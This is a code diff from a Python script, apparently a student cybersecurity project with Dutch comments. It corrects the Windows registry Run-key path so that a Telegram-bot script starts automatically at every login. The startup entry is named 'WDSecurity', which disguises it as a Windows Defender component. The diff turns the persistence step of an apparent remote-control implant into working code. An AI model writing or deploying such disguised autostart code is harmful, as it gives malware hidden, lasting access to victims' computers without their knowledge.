@@ -112,7 +112,7 @@ def powershell_command(cmd):
 def add_to_registry(program_name, program_path):
     try:
         #Bepaal de registersleutel voor de huidige gebruiker
-        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\CurrentVersion\Run")
+        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
 
         # Voeg een nieuwe registerwaarde toe
         winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, program_path)
@@ -126,5 +126,5 @@ def add_to_registry(program_name, program_path):
         print(f"Fout bij toevoegen aan het register: {e}")
 
 programma_naam = "WDSecurity"
-programma_pad = "C:\Users\rishi\gh-repos\AD-CS-python\pythonTelegramBot\main.py"
+programma_pad = r"C:\Users\RR\Downloads\Minor-AD-CS-blok-3\pythonTelegramBot\main.py"
 add_to_registry(programma_naam, programma_pad)
